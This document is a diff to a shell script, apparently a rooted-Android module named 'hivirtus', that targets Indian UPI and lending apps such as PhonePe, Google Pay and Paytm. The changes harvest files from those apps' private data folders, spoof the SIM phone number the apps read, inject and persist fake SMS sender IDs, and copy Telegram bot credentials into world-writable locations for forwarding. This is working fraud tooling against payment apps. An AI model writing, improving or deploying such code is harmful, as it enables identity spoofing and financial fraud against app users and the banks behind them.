@@ -67,8 +67,11 @@ is_upi_pkg() {
 }
 
 # PhonePe often cannot write /data/local/tmp — copy Save from app files / Download
+# CRITICAL: pick NEWEST ui_save.json (first-package was locking old PhonePe number)
 hivirtus_harvest_saves() {
-  local found="" f pkg bn
+  local found="" f pkg bn mt best_mt=0
+  best_mt=0
+  found=""
   for pkg in $UPI_PACKAGES; do
     pkg=$(echo "$pkg" | tr -d ' \r\n')
     [ -z "$pkg" ] && continue
@@ -77,44 +80,121 @@ hivirtus_harvest_saves() {
       "/data/user/0/$pkg/files/hivirtus_ui_save.json" \
       "/data/user_de/0/$pkg/files/hivirtus_ui_save.json" \
       "/data/data/$pkg/cache/hivirtus_ui_save.json" \
+      "/data/data/$pkg/code_cache/hivirtus/ui_save.json" \
+      "/data/user/0/$pkg/code_cache/hivirtus/ui_save.json" \
       "/storage/emulated/0/Android/data/$pkg/files/hivirtus_ui_save.json"
     do
-      if [ -f "$f" ] && [ -s "$f" ]; then
+      [ -f "$f" ] && [ -s "$f" ] || continue
+      # Prefer saves that actually contain phone or sender
+      grep -qE 'mock_phone_sim1|inject_sender_id|telegram_bot_token' "$f" 2>/dev/null || continue
+      mt=$(stat -c %Y "$f" 2>/dev/null || echo 0)
+      if [ "$mt" -gt "$best_mt" ]; then
+        best_mt=$mt
         found="$f"
-        break 2
       fi
     done
   done
-  [ -z "$found" ] && for f in \
+  for f in \
     /sdcard/Documents/hivirtus_ui_save.json \
     /sdcard/Download/hivirtus_ui_save.json \
     /storage/emulated/0/Documents/hivirtus_ui_save.json \
-    /storage/emulated/0/Download/hivirtus_ui_save.json
+    /storage/emulated/0/Download/hivirtus_ui_save.json \
+    "$MODDIR/ui_save.json"
   do
-    if [ -f "$f" ] && [ -s "$f" ]; then
+    [ -f "$f" ] && [ -s "$f" ] || continue
+    mt=$(stat -c %Y "$f" 2>/dev/null || echo 0)
+    if [ "$mt" -gt "$best_mt" ]; then
+      best_mt=$mt
       found="$f"
-      break
     fi
   done
-    if [ -n "$found" ]; then
-    # CRITICAL: only promote if app copy is NEWER than global tmp.
-    # Old PhonePe/Paytm copies were overwriting fresh Save → same number stuck.
+
+  if [ -n "$found" ]; then
     TMP_SAVE=/data/local/tmp/hivirtus_ui_save.json
-    FOUND_MT=$(stat -c %Y "$found" 2>/dev/null || echo 0)
+    FOUND_MT=$best_mt
     TMP_MT=$(stat -c %Y "$TMP_SAVE" 2>/dev/null || echo 0)
     FOUND_PHONE=$(grep -o '"mock_phone_sim1"[[:space:]]*:[[:space:]]*"[^"]*"' "$found" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/' | tr -cd '0-9')
     TMP_PHONE=""
     [ -f "$TMP_SAVE" ] && TMP_PHONE=$(grep -o '"mock_phone_sim1"[[:space:]]*:[[:space:]]*"[^"]*"' "$TMP_SAVE" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/' | tr -cd '0-9')
+    FOUND_SID=$(grep -o '"inject_sender_id"[[:space:]]*:[[:space:]]*"[^"]*"' "$found" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
+    TMP_SID=""
+    [ -f "$TMP_SAVE" ] && TMP_SID=$(grep -o '"inject_sender_id"[[:space:]]*:[[:space:]]*"[^"]*"' "$TMP_SAVE" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
+
     # Never let empty-phone harvest wipe a good saved number
     if [ ${#TMP_PHONE} -ge 10 ] && [ ${#FOUND_PHONE} -lt 10 ]; then
       echo "harvest_skip_empty_phone:$found $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
-    elif [ ! -f "$TMP_SAVE" ] || [ "$FOUND_MT" -gt "$TMP_MT" ]; then
-      cp -f "$found" "$TMP_SAVE" 2>/dev/null
-      chmod 666 "$TMP_SAVE" 2>/dev/null
-      echo "harvest_save:$found $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
-      date +%s > /data/local/tmp/hivirtus_harvest_log.ts 2>/dev/null
+    elif [ ! -f "$TMP_SAVE" ] || [ "$FOUND_MT" -ge "$TMP_MT" ]; then
+      # If tmp has a phone and found has a DIFFERENT older phone, only promote if found is newer
+      if [ ${#TMP_PHONE} -ge 10 ] && [ ${#FOUND_PHONE} -ge 10 ] && [ "$TMP_PHONE" != "$FOUND_PHONE" ] && [ "$FOUND_MT" -le "$TMP_MT" ]; then
+        echo "harvest_skip_stale_phone:$found tmp=$TMP_PHONE found=$FOUND_PHONE $(date +%s)" \
+          >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
+      else
+        cp -f "$found" "$TMP_SAVE" 2>/dev/null
+        chmod 666 "$TMP_SAVE" 2>/dev/null
+        echo "harvest_save:$found phone=${FOUND_PHONE:-none} sid=${FOUND_SID:-none} $(date +%s)" \
+          >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
+        date +%s > /data/local/tmp/hivirtus_harvest_log.ts 2>/dev/null
+      fi
+    fi
+
+    # Promote sender from newest harvest even if phone logic skipped
+    if [ -n "$FOUND_SID" ] && [ "$FOUND_SID" != "AD-TEST-S" ]; then
+      if [ -z "$TMP_SID" ] || [ "$FOUND_MT" -ge "$TMP_MT" ]; then
+        echo "$FOUND_SID" > /data/local/tmp/hivirtus_sender_id.txt 2>/dev/null
+        echo "$FOUND_SID" > "$MODDIR/sender_id.txt" 2>/dev/null
+        chmod 666 /data/local/tmp/hivirtus_sender_id.txt "$MODDIR/sender_id.txt" 2>/dev/null
+      fi
     fi
   fi
+
+  # Also harvest dedicated sender / spoof files (newest wins)
+  local best_sid="" best_sid_mt=0 best_ph="" best_ph_mt=0
+  for pkg in $UPI_PACKAGES; do
+    pkg=$(echo "$pkg" | tr -d ' \r\n')
+    [ -z "$pkg" ] && continue
+    for f in \
+      "/data/data/$pkg/files/hivirtus_sender_id.txt" \
+      "/data/user/0/$pkg/files/hivirtus_sender_id.txt" \
+      "/data/data/$pkg/code_cache/hivirtus/hivirtus_sender_id.txt" \
+      "/sdcard/Documents/hivirtus_sender_id.txt"
+    do
+      [ -s "$f" ] || continue
+      mt=$(stat -c %Y "$f" 2>/dev/null || echo 0)
+      line=$(head -n1 "$f" 2>/dev/null | tr -d '\r\n')
+      [ -z "$line" ] || [ "$line" = "AD-TEST-S" ] && continue
+      if [ "$mt" -gt "$best_sid_mt" ]; then
+        best_sid_mt=$mt
+        best_sid="$line"
+      fi
+    done
+    for f in \
+      "/data/data/$pkg/files/hivirtus_spoof_phone.txt" \
+      "/data/user/0/$pkg/files/hivirtus_spoof_phone.txt" \
+      "/data/data/$pkg/code_cache/hivirtus/hivirtus_spoof_phone.txt" \
+      "/sdcard/Documents/hivirtus_spoof_phone.txt" \
+      "/sdcard/Download/hivirtus_spoof_phone.txt"
+    do
+      [ -s "$f" ] || continue
+      mt=$(stat -c %Y "$f" 2>/dev/null || echo 0)
+      dig=$(head -n1 "$f" 2>/dev/null | tr -cd '0-9')
+      [ ${#dig} -lt 10 ] && continue
+      if [ "$mt" -gt "$best_ph_mt" ]; then
+        best_ph_mt=$mt
+        best_ph="$dig"
+      fi
+    done
+  done
+  if [ -n "$best_sid" ]; then
+    TMP_SID_MT=$(stat -c %Y /data/local/tmp/hivirtus_sender_id.txt 2>/dev/null || echo 0)
+    if [ ! -s /data/local/tmp/hivirtus_sender_id.txt ] || [ "$best_sid_mt" -ge "$TMP_SID_MT" ]; then
+      echo "$best_sid" > /data/local/tmp/hivirtus_sender_id.txt
+      echo "$best_sid" > "$MODDIR/sender_id.txt"
+      chmod 666 /data/local/tmp/hivirtus_sender_id.txt "$MODDIR/sender_id.txt" 2>/dev/null
+      echo "harvest_sender:$best_sid $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
+    fi
+  fi
+  # Phone file harvest ONLY if no explicit save request and only as fill-in later
+
   for pkg in com.phonepe.app com.google.android.apps.nbu.paisa.user net.one97.paytm com.yespay.next com.kreditbee.android com.herofincorp.diyjourneys; do
     for f in \
       "/data/data/$pkg/files/hivirtus_telegram_credentials.json" \
@@ -127,7 +207,6 @@ hivirtus_harvest_saves() {
       chmod 666 "/data/local/tmp/$bn" 2>/dev/null
     done
   done
-  # NEVER harvest hivirtus_tg_test.request — that caused infinite TG test spam
   for f in /sdcard/Documents/hivirtus_telegram_credentials.json \
            /sdcard/Download/hivirtus_telegram_credentials.json; do
     [ -f "$f" ] && [ -s "$f" ] || continue
@@ -169,18 +248,43 @@ sync_config() {
     chmod 644 "$RUNTIME" 2>/dev/null
   fi
   if [ -n "$SRC" ]; then
-    # Instant Save request from menu (digits\ne164)
-    if [ -s /data/local/tmp/hivirtus_phone_save.request ]; then
-      REQ_PHONE=$(head -n1 /data/local/tmp/hivirtus_phone_save.request 2>/dev/null | tr -cd '0-9')
-      [ ${#REQ_PHONE} -ge 10 ] && SPOOF_PHONE="$REQ_PHONE"
-      rm -f /data/local/tmp/hivirtus_phone_save.request 2>/dev/null
-    else
-      SPOOF_PHONE=""
-    fi
+    SPOOF_PHONE=""
+    # Instant Save request from menu (digits\ne164) — highest priority
+    # Also check Documents/Download — apps often cannot write /data/local/tmp
+    for reqf in /data/local/tmp/hivirtus_phone_save.request \
+                /sdcard/Documents/hivirtus_phone_save.request \
+                /sdcard/Download/hivirtus_phone_save.request \
+                /storage/emulated/0/Documents/hivirtus_phone_save.request \
+                /storage/emulated/0/Download/hivirtus_phone_save.request
+    do
+      [ -s "$reqf" ] || continue
+      REQ_PHONE=$(head -n1 "$reqf" 2>/dev/null | tr -cd '0-9')
+      if [ ${#REQ_PHONE} -ge 12 ] && printf '%s' "$REQ_PHONE" | grep -q '^91'; then
+        REQ_PHONE=$(printf '%s' "$REQ_PHONE" | awk '{print substr($0,length($0)-9)}')
+      fi
+      if [ ${#REQ_PHONE} -gt 10 ]; then
+        REQ_PHONE=$(printf '%s' "$REQ_PHONE" | awk '{print substr($0,length($0)-9)}')
+      fi
+      if [ ${#REQ_PHONE} -ge 10 ]; then
+        SPOOF_PHONE="$REQ_PHONE"
+        rm -f /data/local/tmp/hivirtus_phone_save.request \
+              /sdcard/Documents/hivirtus_phone_save.request \
+              /sdcard/Download/hivirtus_phone_save.request \
+              /storage/emulated/0/Documents/hivirtus_phone_save.request \
+              /storage/emulated/0/Download/hivirtus_phone_save.request 2>/dev/null
+        echo "phone_from_request $SPOOF_PHONE src=$reqf $(date +%s)" >> /data/local/tmp/hivirtus_phone_sync.log 2>/dev/null
+        break
+      fi
+    done
+    # Save JSON is source of truth (never let stale spoof_phone.txt win)
     if [ -z "$SPOOF_PHONE" ] || [ ${#SPOOF_PHONE} -lt 10 ]; then
-      SPOOF_PHONE=$(grep -o '"mock_phone_sim1"[[:space:]]*:[[:space:]]*"[^"]*"' "$SRC" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/' | tr -cd '0-9')
+      for jf in /data/local/tmp/hivirtus_ui_save.json "$RUNTIME" "$MODDIR/ui_save.json" "$SRC"; do
+        [ -f "$jf" ] || continue
+        SPOOF_PHONE=$(grep -o '"mock_phone_sim1"[[:space:]]*:[[:space:]]*"[^"]*"' "$jf" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/' | tr -cd '0-9')
+        [ ${#SPOOF_PHONE} -ge 10 ] && break
+      done
     fi
-    # Prefer existing non-empty spoof file if JSON phone empty
+    # Last resort only: existing spoof / module file (NOT stale app copies — they lock old numbers)
     if [ -z "$SPOOF_PHONE" ] || [ ${#SPOOF_PHONE} -lt 10 ]; then
       [ -s /data/local/tmp/hivirtus_spoof_phone.txt ] && \
         SPOOF_PHONE=$(head -n1 /data/local/tmp/hivirtus_spoof_phone.txt 2>/dev/null | tr -cd '0-9')
@@ -189,41 +293,11 @@ sync_config() {
       [ -s "$MODDIR/spoof_phone.txt" ] && \
         SPOOF_PHONE=$(head -n1 "$MODDIR/spoof_phone.txt" 2>/dev/null | tr -cd '0-9')
     fi
-    # App filesDir / code_cache — menu Save often lands here when tmp write blocked
-    if [ -z "$SPOOF_PHONE" ] || [ ${#SPOOF_PHONE} -lt 10 ]; then
-      for pkg in com.phonepe.app com.herofincorp.diyjourneys com.herofincorp.simplycash \
-                 com.customer.herofincorp com.google.android.apps.nbu.paisa.user \
-                 net.one97.paytm com.yespay.next com.fampay.in com.stashfin.android \
-                 com.google.android.apps.messaging com.flipkart.android; do
-        for f in \
-          "/data/data/$pkg/files/hivirtus_spoof_phone.txt" \
-          "/data/user/0/$pkg/files/hivirtus_spoof_phone.txt" \
-          "/data/data/$pkg/code_cache/hivirtus/hivirtus_spoof_phone.txt" \
-          "/data/user/0/$pkg/code_cache/hivirtus/hivirtus_spoof_phone.txt" \
-          "/sdcard/Documents/hivirtus_spoof_phone.txt" \
-          "/sdcard/Download/hivirtus_spoof_phone.txt"
-        do
-          [ -s "$f" ] || continue
-          SPOOF_PHONE=$(head -n1 "$f" 2>/dev/null | tr -cd '0-9')
-          [ ${#SPOOF_PHONE} -ge 10 ] && break 2
-        done
-        # Also from ui_save.json in app
-        for f in \
-          "/data/data/$pkg/files/hivirtus_ui_save.json" \
-          "/data/user/0/$pkg/files/hivirtus_ui_save.json" \
-          "/data/data/$pkg/code_cache/hivirtus/ui_save.json"
-        do
-          [ -s "$f" ] || continue
-          SPOOF_PHONE=$(grep -o '"mock_phone_sim1"[[:space:]]*:[[:space:]]*"[^"]*"' "$f" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/' | tr -cd '0-9')
-          [ ${#SPOOF_PHONE} -ge 10 ] && break 2
-        done
-      done
-    fi
     if [ -n "$SPOOF_PHONE" ] && [ ${#SPOOF_PHONE} -ge 10 ]; then
       SPOOF_PHONE=$(printf '%s' "$SPOOF_PHONE" | tr -cd '0-9')
       # Normalize to last 10 digits for India (+91 / 91 prefix)
       if [ "${#SPOOF_PHONE}" -ge 12 ] && printf '%s' "$SPOOF_PHONE" | grep -q '^91'; then
-        SPOOF_PHONE=$(printf '%s' "$SPOOF_PHONE" | sed 's/^91//' )
+        SPOOF_PHONE=$(printf '%s' "$SPOOF_PHONE" | awk '{print substr($0,length($0)-9)}')
       fi
       if [ "${#SPOOF_PHONE}" -gt 10 ]; then
         SPOOF_PHONE=$(printf '%s' "$SPOOF_PHONE" | awk '{print substr($0,length($0)-9)}')
@@ -240,13 +314,41 @@ sync_config() {
         [ -f "$cfgf" ] || continue
         if grep -q '"mock_phone_sim1"' "$cfgf" 2>/dev/null; then
           sed -i "s/\"mock_phone_sim1\"[[:space:]]*:[[:space:]]*\"[^\"]*\"/\"mock_phone_sim1\": \"${E164}\"/" "$cfgf" 2>/dev/null || true
+        else
+          # Insert key if missing (best-effort)
+          sed -i "s/{/{\n  \"mock_phone_sim1\": \"${E164}\",/" "$cfgf" 2>/dev/null || true
         fi
       done
       echo "phone_sync_ok $E164 $(date +%s)" >> /data/local/tmp/hivirtus_phone_sync.log 2>/dev/null
       chmod 666 /data/local/tmp/hivirtus_phone_sync.log 2>/dev/null
     fi
-    # Promote sender id from Save JSON → durable files (menu cut pe na hatе)
-    SID=$(grep -o '"inject_sender_id"[[:space:]]*:[[:space:]]*"[^"]*"' "$SRC" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
+
+    # Sender ID — request file first (tmp + Documents), then JSON, then files
+    SID=""
+    for reqf in /data/local/tmp/hivirtus_sender_save.request \
+                /sdcard/Documents/hivirtus_sender_save.request \
+                /sdcard/Download/hivirtus_sender_save.request \
+                /storage/emulated/0/Documents/hivirtus_sender_save.request \
+                /storage/emulated/0/Download/hivirtus_sender_save.request
+    do
+      [ -s "$reqf" ] || continue
+      SID=$(head -n1 "$reqf" 2>/dev/null | tr -d '\r\n')
+      [ -z "$SID" ] || [ "$SID" = "AD-TEST-S" ] && continue
+      rm -f /data/local/tmp/hivirtus_sender_save.request \
+            /sdcard/Documents/hivirtus_sender_save.request \
+            /sdcard/Download/hivirtus_sender_save.request \
+            /storage/emulated/0/Documents/hivirtus_sender_save.request \
+            /storage/emulated/0/Download/hivirtus_sender_save.request 2>/dev/null
+      echo "sender_from_request $SID src=$reqf $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
+      break
+    done
+    if [ -z "$SID" ] || [ "$SID" = "AD-TEST-S" ]; then
+      for jf in /data/local/tmp/hivirtus_ui_save.json "$RUNTIME" "$MODDIR/ui_save.json" "$SRC"; do
+        [ -f "$jf" ] || continue
+        SID=$(grep -o '"inject_sender_id"[[:space:]]*:[[:space:]]*"[^"]*"' "$jf" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
+        [ -n "$SID" ] && [ "$SID" != "AD-TEST-S" ] && break
+      done
+    fi
     if [ -z "$SID" ] || [ "$SID" = "AD-TEST-S" ]; then
       [ -s /data/local/tmp/hivirtus_sender_id.txt ] && \
         SID=$(head -n1 /data/local/tmp/hivirtus_sender_id.txt 2>/dev/null | tr -d '\r\n')
@@ -255,11 +357,27 @@ sync_config() {
       [ -s "$MODDIR/sender_id.txt" ] && \
         SID=$(head -n1 "$MODDIR/sender_id.txt" 2>/dev/null | tr -d '\r\n')
     fi
+    # Documents fallback (app-writable when tmp blocked)
+    if [ -z "$SID" ] || [ "$SID" = "AD-TEST-S" ]; then
+      for f in /sdcard/Documents/hivirtus_sender_id.txt /sdcard/Download/hivirtus_sender_id.txt; do
+        [ -s "$f" ] || continue
+        SID=$(head -n1 "$f" 2>/dev/null | tr -d '\r\n')
+        [ -n "$SID" ] && [ "$SID" != "AD-TEST-S" ] && break
+      done
+    fi
     if [ -n "$SID" ] && [ "$SID" != "AD-TEST-S" ]; then
       echo "$SID" > /data/local/tmp/hivirtus_sender_id.txt
       echo "$SID" > "$MODDIR/sender_id.txt"
       chmod 666 /data/local/tmp/hivirtus_sender_id.txt 2>/dev/null
       chmod 666 "$MODDIR/sender_id.txt" 2>/dev/null
+      # Patch JSON sender too
+      for cfgf in "$MODDIR/config.json" "$MODDIR/ui_save.json" "$RUNTIME" /data/local/tmp/hivirtus_ui_save.json; do
+        [ -f "$cfgf" ] || continue
+        if grep -q '"inject_sender_id"' "$cfgf" 2>/dev/null; then
+          sed -i "s/\"inject_sender_id\"[[:space:]]*:[[:space:]]*\"[^\"]*\"/\"inject_sender_id\": \"${SID}\"/" "$cfgf" 2>/dev/null || true
+        fi
+      done
+      echo "sender_sync_ok $SID $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
     fi
     # Never copy empty sender over a good module file
     if [ -s /data/local/tmp/hivirtus_sender_id.txt ]; then
